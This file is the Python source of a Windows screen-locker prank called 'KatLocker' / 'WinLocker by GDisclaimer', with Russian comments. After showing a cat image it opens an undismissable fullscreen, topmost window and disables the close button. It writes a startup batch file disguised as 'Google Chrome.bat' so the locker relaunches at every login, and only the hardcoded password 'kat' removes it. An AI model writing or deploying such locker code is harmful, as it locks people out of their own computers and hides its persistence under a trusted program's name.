#ВАЖНО ПАРОЛЬ:kat
import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
from time import sleep
import requests
from io import BytesIO
import PIL.Image
import PIL.ImageTk

url = 'https://i.gifer.com/LF0M.gif' #Этоу гифку необходимо скачать и поместить в один фаил с кодом

window = Tk()
try:
    photo = PhotoImage(file="Cat.gif")
    w = Label(window, image=photo)
    w.image = photo  # Сохраняем ссылку!
    w.pack()
except Exception as e:
    print(f"Не удалось загрузить изображение: {e}")
    # Создаем заглушку, если нет картинки
    w = Label(window, text="🐱", font=("Arial", 100), bg='black', fg='white')
    w.pack()

b1= Button(window, text='Нажми на меня', command=window.destroy) #Отвечает за кнопку закрытия
b1.pack(pady=10)


window.resizable(0, 0) # Отвечает за изменение окна 


window.title("Kat")   # Название окна
window['bg'] = 'black'


window.mainloop() #Закрыть окно

USER_NAME = getpass.getuser()

window = Tk()
window.title("WinLocker by GDisclaimer")  
window.geometry('400x250')
window['bg'] = 'black'

# Base size
normal_width = 1920
normal_height = 1080

# Get screen size
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

# Get percentage of screen size from Base size
percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)

# Make a scaling factor, this is bases on average percentage from
# width and height.
scale_factor = ((percentage_width + percentage_height) / 2) / 100

# Set the fontsize based on scale_factor,
# if the fontsize is less than minimum_size
# it is set to the minimum size

fontsize = int(20 * scale_factor)
minimum_size = 10
if fontsize < minimum_size:
       fontsize = minimum_size

fontsizeHding = int(72 * scale_factor)
minimum_size = 40
if fontsizeHding < minimum_size:
       fontsizeHding = minimum_size

# Create a style and configure for ttk.Button widget
default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))

    # Исправленный путь (убедимся, что папка существует)
    bat_path = fr'C:\Users\{USER_NAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

    # Создаем папку, если её нет
    os.makedirs(bat_path, exist_ok=True)

    # Полный путь к файлу
    full_path = os.path.join(bat_path, "Google Chrome.bat")

    try:
        with open(full_path, "w") as bat_file:
            bat_file.write(f'@echo off\nstart "" "{file_path}"')
        print(f"Файл успешно создан: {full_path}")
        return True
    except Exception as e:
        print(f"Ошибка при создании файла: {e}")
        return False
    with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

def block():
    pyautogui.moveTo(x=680,y=800)
    window.protocol("WM_DELETE_WINDOW",block)
    window.update()

def fullscreen():
    window.attributes('-fullscreen', True, '-topmost', True)

def clicked():
    res = format(txt.get())
    if res == 'kat':
        file_path = '/tmp/file.txt'
        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
        os.remove(file_path)
        sys.exit()

add_to_startup("C:\\myFiles\\main.py")
fullscreen()

txt_one = Label(window, text='KatLocker', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='Мяу 😀', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window, text='К сожалению ваш компютер отакован котиком', font=("Arial Bold", fontsize), fg='white', bg='black')

txt_one.grid(column=0, row=0)
txt_two.grid(column=0, row=0)
txt_three.grid(column=0, row=0)

txt_one.place(relx = .01, rely = .01)
txt_two.place(relx = .01, rely = .11)
txt_three.place(relx = .01, rely = .21)


txt = Entry(window)  
btn = Button(window, text="Котик вводиться туть ;)", command=clicked)  
txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)

block()

window.mainloop()
#ВАЖНО ПАРОЛЬ:kat
